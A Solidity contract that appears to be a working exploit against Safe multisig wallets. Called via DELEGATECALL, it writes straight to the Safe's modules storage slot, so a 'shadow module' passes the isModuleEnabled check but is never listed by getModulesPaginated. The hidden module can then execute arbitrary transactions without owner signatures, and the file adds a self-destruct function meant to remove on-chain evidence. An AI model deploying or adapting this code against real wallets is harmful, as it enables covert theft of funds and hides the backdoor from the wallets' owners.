// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title ShadowModuleInjector
/// @notice Called via DELEGATECALL from a Safe to inject a shadow module.
/// @dev When executed via DELEGATECALL, all storage writes target the calling Safe's storage.
///      This writes directly to the Safe's `modules` mapping (storage slot 1) so that
///      `isModuleEnabled(shadowModule)` returns true, but the linked list traversed by
///      `getModulesPaginated()` is left untouched — making the shadow module invisible.
///
///      Safe storage layout (from SafeStorage.sol / inheritance order):
///        slot 0: singleton (address)
///        slot 1: modules   (mapping(address => address))
///        slot 2: owners    (mapping(address => address))
///
///      The modules mapping is a linked list identical in structure to owners:
///        modules[SENTINEL(0x1)] -> module1 -> module2 -> ... -> SENTINEL(0x1)
///      isModuleEnabled(addr) returns true when modules[addr] != address(0) and addr != SENTINEL.
///      getModulesPaginated() walks the list from modules[start] and only returns reachable entries.
///
///      By setting modules[shadowModule] = non-zero WITHOUT inserting it into the linked list,
///      isModuleEnabled() returns true but getModulesPaginated() never encounters it.
///      The shadow module can then call execTransactionFromModule() to execute arbitrary
///      transactions without any owner signatures.
contract ShadowModuleInjector {
    /// @notice The storage slot index for the `modules` mapping in Safe contracts.
    uint256 private constant MODULES_MAPPING_SLOT = 1;

    /// @notice Sentinel value used by Safe's linked-list module structure.
    address private constant SENTINEL_MODULES = address(0x1);

    /// @notice Injects a shadow module into the Safe's modules mapping.
    /// @dev Must be called via DELEGATECALL so that sstore targets the Safe's storage.
    /// @param shadowModule The address to make a hidden module.
    function injectShadowModule(address shadowModule) external {
        require(shadowModule != address(0), "Shadow module cannot be zero address");
        require(shadowModule != SENTINEL_MODULES, "Shadow module cannot be sentinel");

        // Compute the storage slot: keccak256(abi.encode(shadowModule, MODULES_MAPPING_SLOT))
        bytes32 slot = keccak256(abi.encode(shadowModule, MODULES_MAPPING_SLOT));

        // Set modules[shadowModule] = SENTINEL_MODULES (a non-zero value).
        // This makes isModuleEnabled(shadowModule) return true.
        assembly {
            sstore(slot, 0x0000000000000000000000000000000000000000000000000000000000000001)
        }
    }

    /// @notice Self-destruct the injector to remove on-chain evidence.
    /// @dev DO NOT call this during the delegatecall (that would destroy the Safe!).
    ///      Call in a separate transaction from any address.
    ///      Note: Since EIP-6780 (Cancun), SELFDESTRUCT only deletes code if called
    ///      in the same transaction as contract creation. Otherwise only ETH is transferred.
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
